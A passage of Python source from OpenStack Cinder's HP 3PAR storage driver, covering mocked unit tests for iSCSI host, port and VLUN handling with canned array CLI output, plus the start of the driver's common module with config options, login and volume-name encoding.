    def setup_fakes(self):
        super(TestHP3PARISCSIDriver, self).setup_fakes()

        self.stubs.Set(hpdriver.HP3PARISCSIDriver, ""_create_3par_iscsi_host"",
                       self.fake_create_3par_iscsi_host)

        #target_iqn = 'iqn.2000-05.com.3pardata:21810002ac00383d'
        self.properties = {'data':
                          {'target_discovered': True,
                           'target_iqn': self.TARGET_IQN,
                           'target_lun': 186,
                           'target_portal': '1.1.1.2:1234'},
                           'driver_volume_type': 'iscsi'}

    def tearDown(self):
        shutil.rmtree(self.tempdir)
        self._hosts = {}
        super(TestHP3PARISCSIDriver, self).tearDown()

    def setup_driver(self, configuration, set_up_fakes=True):
        self.driver = hpdriver.HP3PARISCSIDriver(configuration=configuration)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)

        if set_up_fakes:
            self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_ports"",
                           self.fake_get_ports)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.driver.do_setup(None)

    def fake_create_3par_iscsi_host(self, hostname, iscsi_iqn,
                                    domain, persona_id):
        host = {'FCPaths': [],
                'descriptors': None,
                'domain': domain,
                'iSCSIPaths': [{'driverVersion': None,
                                'firmwareVersion': None,
                                'hostSpeed': 0,
                                'ipAddr': '10.10.221.59',
                                'model': None,
                                'name': iscsi_iqn,
                                'portPos': {'cardPort': 1, 'node': 1,
                                            'slot': 8},
                                'vendor': None}],
                'id': 11,
                'name': hostname}
        self._hosts[hostname] = host
        return hostname

    def test_initialize_connection(self):
        self.flags(lock_path=self.tempdir)
        result = self.driver.initialize_connection(self.volume, self.connector)
        self.assertEqual(result['driver_volume_type'], 'iscsi')
        self.assertEqual(result['data']['target_iqn'],
                         self.properties['data']['target_iqn'])
        self.assertEqual(result['data']['target_portal'],
                         self.properties['data']['target_portal'])
        self.assertEqual(result['data']['target_discovered'],
                         self.properties['data']['target_discovered'])

        # we should have a host and a vlun now.
        host = self.fake_get_3par_host(self.FAKE_HOST)
        self.assertEquals(self.FAKE_HOST, host['name'])
        self.assertEquals(HP3PAR_DOMAIN, host['domain'])
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)

        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])
        self.assertEquals(self.FAKE_HOST, vlun['hostname'])

    def test_get_volume_stats(self):
        self.flags(lock_path=self.tempdir)

        def fake_safe_get(*args):
            return ""HP3PARFCDriver""

        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'iSCSI')
        self.assertEquals(stats['total_capacity_gb'], 'infinite')
        self.assertEquals(stats['free_capacity_gb'], 'infinite')

        #modify the CPG to have a limit
        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)
        options = {'SDGrowth': {'limitMiB': 8192}}
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, options)

        const = 0.0009765625
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'iSCSI')
        total_capacity_gb = 8192 * const
        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)
        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)
        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, {})

    def test_create_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost',
                            'iqn.1993-08.org.debian:01:222'])
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_create_invalid_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',
                           ('OpenStack',), 'fakehost',
                            'iqn.1993-08.org.debian:01:222'])
        in_use_ret = pack('\r\nalready used by host fakehost.foo ')
        _run_ssh(create_host_cmd, False).AndReturn([in_use_ret, ''])

        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']
        _run_ssh(show_3par_cmd, False).AndReturn([pack(ISCSI_3PAR_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)

        self.assertEquals(host['name'], 'fakehost.foo')

    def test_create_modify_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_NO_HOST_RET), ''])

        create_host_cmd = ['createhost', '-iscsi', '-add', 'fakehost',
                           'iqn.1993-08.org.debian:01:222']
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])
        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_get_ports(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI),
                                                    ''])
        self.mox.ReplayAll()

        ports = self.driver.common.get_ports()
        self.assertEqual(ports['FC'][0], '20210002AC00383D')
        self.assertEqual(ports['iSCSI']['10.10.120.252']['nsp'], '0:8:2')

    def test_get_iscsi_ip_active(self):
        self.flags(lock_path=self.tempdir)

        #record set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        self.mox.ReplayAll()

        config = self.setup_configuration()
        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']
        self.setup_driver(config, set_up_fakes=False)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN), ''])

        self.mox.ReplayAll()

        ip = self.driver._get_iscsi_ip('fakehost')
        self.assertEqual(ip, '10.10.220.253')

    def test_get_iscsi_ip(self):
        self.flags(lock_path=self.tempdir)

        #record driver set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        #record
        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']
        show_vlun_ret = 'no vluns listed\r\n'
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(show_vlun_ret), ''])
        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])

        self.mox.ReplayAll()

        config = self.setup_configuration()
        config.iscsi_ip_address = '10.10.10.10'
        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']
        self.setup_driver(config, set_up_fakes=False)

        ip = self.driver._get_iscsi_ip('fakehost')
        self.assertEqual(ip, '10.10.220.252')

    def test_invalid_iscsi_ip(self):
        self.flags(lock_path=self.tempdir)

        #record driver set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        config = self.setup_configuration()
        config.hp3par_iscsi_ips = ['10.10.220.250', '10.10.220.251']
        config.iscsi_ip_address = '10.10.10.10'
        self.mox.ReplayAll()

        # no valid ip addr should be configured.
        self.assertRaises(exception.InvalidInput,
                          self.setup_driver,
                          config,
                          set_up_fakes=False)

    def test_get_least_used_nsp(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])

        self.mox.ReplayAll()
        # in use count                           11       12
        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:8:1'])
        self.assertEqual(nsp, '0:2:1')

        # in use count                            11       10
        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:2:1'])
        self.assertEqual(nsp, '1:2:1')

        # in use count                            0       10
        nsp = self.driver._get_least_used_nsp(['1:1:1', '1:2:1'])
        self.assertEqual(nsp, '1:1:1')


def pack(arg):
    header = '\r\n\r\n\r\n\r\n\r\n'
    footer = '\r\n\r\n\r\n'
    return header + arg + footer

FC_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost,Generic,50014380242B8B4C,0:2:1,n/a\r\n'
    '75,fakehost,Generic,50014380242B8B4E,---,n/a\r\n'
    '75,fakehost,Generic,1000843497F90711,0:2:1,n/a \r\n'
    '75,fakehost,Generic,1000843497F90715,1:2:1,n/a\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

FC_SHOWHOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost.foo,Generic,50014380242B8B4C,0:2:1,n/a\r\n'
    '75,fakehost.foo,Generic,50014380242B8B4E,---,n/a\r\n'
    '75,fakehost.foo,Generic,1000843497F90711,0:2:1,n/a \r\n'
    '75,fakehost.foo,Generic,1000843497F90715,1:2:1,n/a\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost.foo,--,--\r\n'
    '\r\n'
    '---------- Host fakehost.foo ----------\r\n'
    'Name       : fakehost.foo\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

NO_FC_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost,Generic,iqn.1993-08.org.debian:01:222,---,10.10.222.12\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_NO_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_PORT_IDS_RET = (
    'N:S:P,-Node_WWN/IPAddr-,-----------Port_WWN/iSCSI_Name-----------\r\n'
    '0:2:1,28210002AC00383D,20210002AC00383D\r\n'
    '0:2:2,2FF70002AC00383D,20220002AC00383D\r\n'
    '0:2:3,2FF70002AC00383D,20230002AC00383D\r\n'
    '0:2:4,2FF70002AC00383D,20240002AC00383D\r\n'
    '0:5:1,2FF70002AC00383D,20510002AC00383D\r\n'
    '0:5:2,2FF70002AC00383D,20520002AC00383D\r\n'
    '0:5:3,2FF70002AC00383D,20530002AC00383D\r\n'
    '0:5:4,2FF70202AC00383D,20540202AC00383D\r\n'
    '0:6:4,2FF70002AC00383D,20640002AC00383D\r\n'
    '0:8:1,10.10.120.253,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '0:8:2,0.0.0.0,iqn.2000-05.com.3pardata:20820002ac00383d\r\n'
    '1:2:1,29210002AC00383D,21210002AC00383D\r\n'
    '1:2:2,2FF70002AC00383D,21220002AC00383D\r\n'
    '-----------------------------------------------------------------\r\n')

VOLUME_STATE_RET = (
    'Id,Name,Prov,Type,State,-Detailed_State-\r\n'
    '410,volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7,snp,vcopy,normal,'
    'normal\r\n'
    '-----------------------------------------------------------------\r\n')

PORT_RET = (
    'N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,Protocol,'
    'Label,Partner,FailoverState\r\n'
    '0:2:1,target,ready,28210002AC00383D,20210002AC00383D,host,FC,'
    '-,1:2:1,none\r\n'
    '0:2:2,initiator,loss_sync,2FF70002AC00383D,20220002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:2:3,initiator,loss_sync,2FF70002AC00383D,20230002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:2:4,initiator,loss_sync,2FF70002AC00383D,20240002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:1,initiator,loss_sync,2FF70002AC00383D,20510002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:2,initiator,loss_sync,2FF70002AC00383D,20520002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:3,initiator,loss_sync,2FF70002AC00383D,20530002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:4,initiator,ready,2FF70202AC00383D,20540202AC00383D,host,FC,'
    '-,1:5:4,active\r\n'
    '0:6:1,initiator,ready,2FF70002AC00383D,20610002AC00383D,disk,FC,'
    '-,-,-\r\n'
    '0:6:2,initiator,ready,2FF70002AC00383D,20620002AC00383D,disk,FC,'
    '-,-,-\r\n')

ISCSI_PORT_RET = (
    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'
    'iSNS_Port\r\n'
    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '0:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,82,1500,n/a,0,0.0.0.0,3205\r\n'
    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '1:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,182,1500,n/a,0,0.0.0.0,3205\r\n')

ISCSI_3PAR_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost.foo,Generic,iqn.1993-08.org.debian:01:222,---,'
    '10.10.222.12\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost.foo,--,--\r\n'
    '\r\n'
    '---------- Host fakehost.foo ----------\r\n'
    'Name       : fakehost.foo\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

SHOW_PORT_ISCSI = (
    'N:S:P,IPAddr,---------------iSCSI_Name----------------\r\n'
    '0:8:1,1.1.1.2,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '0:8:2,10.10.120.252,iqn.2000-05.com.3pardata:20820002ac00383d\r\n'
    '1:8:1,10.10.220.253,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '1:8:2,10.10.220.252,iqn.2000-05.com.3pardata:21820002ac00383d\r\n'
    '-------------------------------------------------------------\r\n')

SHOW_VLUN = (
    'Lun,VVName,HostName,---------Host_WWN/iSCSI_Name----------,Port,Type,'
    'Status,ID\r\n'
    '0,a,fakehost,iqn.1993-08.org.debian:01:3a779e4abc22,1:8:1,matched set,'
    'active,0\r\n'
    '------------------------------------------------------------------------'
    '--------------\r\n')

SHOW_VLUN_NONE = (
    'Port\r\n0:2:1\r\n0:2:1\r\n1:8:1\r\n1:8:1\r\n1:8:1\r\n1:2:1\r\n'
    '1:2:1\r\n1:2:1\r\n1:2:1\r\n1:2:1\r\n1:2:1\r\n1:8:1\r\n1:8:1\r\n1:8:1\r\n'
    '1:8:1\r\n1:8:1\r\n1:8:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n'
    '0:2:1\r\n0:2:1\r\n1:8:1\r\n1:8:1\r\n0:2:1\r\n0:2:1\r\n1:2:1\r\n1:2:1\r\n'
    '1:2:1\r\n1:2:1\r\n1:8:1\r\n-----')

READY_ISCSI_PORT_RET = (
    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'
    'iSNS_Port\r\n'
    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '0:8:2,ready,10.10.120.252,255.255.224.0,0.0.0.0,82,1500,10Gbps,0,'
    '0.0.0.0,3205\r\n'
    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '1:8:2,ready,10.10.220.252,255.255.224.0,0.0.0.0,182,1500,10Gbps,0,'
    '0.0.0.0,3205\r\n'
    '-------------------------------------------------------------------'
    '----------------------\r\n')
/n/n/ncinder/volume/drivers/san/hp/hp_3par_common.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver common utilities for HP 3PAR Storage array

The 3PAR drivers requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

The drivers uses both the REST service and the SSH
command line to correctly operate.  Since the
ssh credentials and the REST credentials can be different
we need to have settings for both.

The drivers requires the use of the san_ip, san_login,
san_password settings for ssh connections into the 3PAR
array.   It also requires the setting of
hp3par_api_url, hp3par_username, hp3par_password
for credentials to talk to the REST service on the 3PAR
array.
""""""

import ast
import base64
import json
import paramiko
import pprint
from random import randint
import re
import time
import uuid

from eventlet import greenthread
from hp3parclient import client
from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import context
from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import volume_types


LOG = logging.getLogger(__name__)

hp3par_opts = [
    cfg.StrOpt('hp3par_api_url',
               default='',
               help=""3PAR WSAPI Server Url like ""
                    ""https://<3par ip>:8080/api/v1""),
    cfg.StrOpt('hp3par_username',
               default='',
               help=""3PAR Super user username""),
    cfg.StrOpt('hp3par_password',
               default='',
               help=""3PAR Super user password"",
               secret=True),
    #TODO(kmartin): Remove hp3par_domain during I release.
    cfg.StrOpt('hp3par_domain',
               default=None,
               help=""This option is DEPRECATED and no longer used. ""
                    ""The 3par domain name to use.""),
    cfg.StrOpt('hp3par_cpg',
               default=""OpenStack"",
               help=""The CPG to use for volume creation""),
    cfg.StrOpt('hp3par_cpg_snap',
               default="""",
               help=""The CPG to use for Snapshots for volumes. ""
                    ""If empty hp3par_cpg will be used""),
    cfg.StrOpt('hp3par_snapshot_retention',
               default="""",
               help=""The time in hours to retain a snapshot.  ""
                    ""You can't delete it before this expires.""),
    cfg.StrOpt('hp3par_snapshot_expiration',
               default="""",
               help=""The time in hours when a snapshot expires ""
                    "" and is deleted.  This must be larger than expiration""),
    cfg.BoolOpt('hp3par_debug',
                default=False,
                help=""Enable HTTP debugging to 3PAR""),
    cfg.ListOpt('hp3par_iscsi_ips',
                default=[],
                help=""List of target iSCSI addresses to use."")
]


CONF = cfg.CONF
CONF.register_opts(hp3par_opts)


class HP3PARCommon(object):

    stats = {}

    # Valid values for volume type extra specs
    # The first value in the list is the default value
    valid_prov_values = ['thin', 'full']
    valid_persona_values = ['1 - Generic',
                            '2 - Generic-ALUA',
                            '6 - Generic-legacy',
                            '7 - HPUX-legacy',
                            '8 - AIX-legacy',
                            '9 - EGENERA',
                            '10 - ONTAP-legacy',
                            '11 - VMware',
                            '12 - OpenVMS']
    hp_qos_keys = ['maxIOPS', 'maxBWS']
    hp3par_valid_keys = ['cpg', 'snap_cpg', 'provisioning', 'persona', 'vvs']

    def __init__(self, config):
        self.sshpool = None
        self.config = config
        self.hosts_naming_dict = dict()
        self.client = None
        if CONF.hp3par_domain is not None:
            LOG.deprecated(_(""hp3par_domain has been deprecated and ""
                             ""is no longer used. The domain is automatically ""
                             ""looked up based on the CPG.""))

    def check_flags(self, options, required_flags):
        for flag in required_flags:
            if not getattr(options, flag, None):
                raise exception.InvalidInput(reason=_('%s is not set') % flag)

    def _create_client(self):
        return client.HP3ParClient(self.config.hp3par_api_url)

    def client_login(self):
        try:
            LOG.debug(""Connecting to 3PAR"")
            self.client.login(self.config.hp3par_username,
                              self.config.hp3par_password)
        except hpexceptions.HTTPUnauthorized as ex:
            LOG.warning(""Failed to connect to 3PAR (%s) because %s"" %
                       (self.config.hp3par_api_url, str(ex)))
            msg = _(""Login to 3PAR array invalid"")
            raise exception.InvalidInput(reason=msg)

    def client_logout(self):
        self.client.logout()
        LOG.debug(""Disconnect from 3PAR"")

    def do_setup(self, context):
        self.client = self._create_client()
        if self.config.hp3par_debug:
            self.client.debug_rest(True)

        self.client_login()

        try:
            # make sure the default CPG exists
            self.validate_cpg(self.config.hp3par_cpg)
            self._set_connections()
        finally:
            self.client_logout()

    def validate_cpg(self, cpg_name):
        try:
            cpg = self.client.getCPG(cpg_name)
        except hpexceptions.HTTPNotFound as ex:
            err = (_(""CPG (%s) doesn't exist on array"") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

    def _set_connections(self):
        """"""Set the number of concurrent connections.

        The 3PAR WS API server has a limit of concurrent connections.
        This is setting the number to the highest allowed, 15 connections.
        """"""
        self._cli_run(['setwsapi', '-sru', 'high'])

    def get_domain(self, cpg_name):
        try:
            cpg = self.client.getCPG(cpg_name)
        except hpexceptions.HTTPNotFound:
            err = (_(""Failed to get domain because CPG (%s) doesn't ""
                     ""exist on array."") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        domain = cpg['domain']
        if not domain:
            err = (_(""CPG (%s) must be in a domain"") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)
        return domain

    def extend_volume(self, volume, new_size):
        volume_name = self._get_3par_vol_name(volume['id'])
        old_size = volume.size
        growth_size = int(new_size) - old_size
        LOG.debug(""Extending Volume %s from %s to %s, by %s GB."" %
                  (volume_name, old_size, new_size, growth_size))
        try:
            self._cli_run(['growvv', '-f', volume_name, '%dg' % growth_size])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error extending volume %s"") % volume)

    def _get_3par_vol_name(self, volume_id):
        """"""Get converted 3PAR volume name.

        Converts the openstack volume id from
        ecffc30f-98cb-4cf5-85ee-d7309cc17cd2
        to
        osv-7P.DD5jLTPWF7tcwnMF80g

        We convert the 128 bits of the uuid into a 24character long
        base64 encoded string to ensure we don't exceed the maximum
        allowed 31 character name limit on 3Par

        We strip the padding '=' and replace + with .
        and / with -
        """"""
        volume_name = self._encode_name(volume_id)
        return ""osv-%s"" % volume_name

    def _get_3par_snap_name(self, snapshot_id):
        snapshot_name = self._encode_name(snapshot_id)
        return ""oss-%s"" % snapshot_name

    def _get_3par_vvs_name(self, volume_id):
        vvs_name = self._encode_name(volume_id)
        return ""vvs-%s"" % vvs_name

    def _encode_name(self, name):
        uuid_str = name.replace(""-"", """")
        vol_uuid = uuid.UUID('urn:uuid:%s' % uuid_str)
        vol_encoded = base64.b64encode(vol_uuid.bytes)

        # 3par doesn't allow +, nor /
        vol_encoded = vol_encoded.replace('+', '.')
        vol_encoded = vol_encoded.replace('/', '-')
        # strip off the == as 3par doesn't like those.
        vol_encoded = vol_encoded.replace('=', '')
        return vol_encoded

    def _capacity_from_size(self, vol_size):

        # because 3PAR volume sizes are in
        # Mebibytes, Gigibytes, not Megabytes.
        MB = 1000L
        MiB = 1.048576

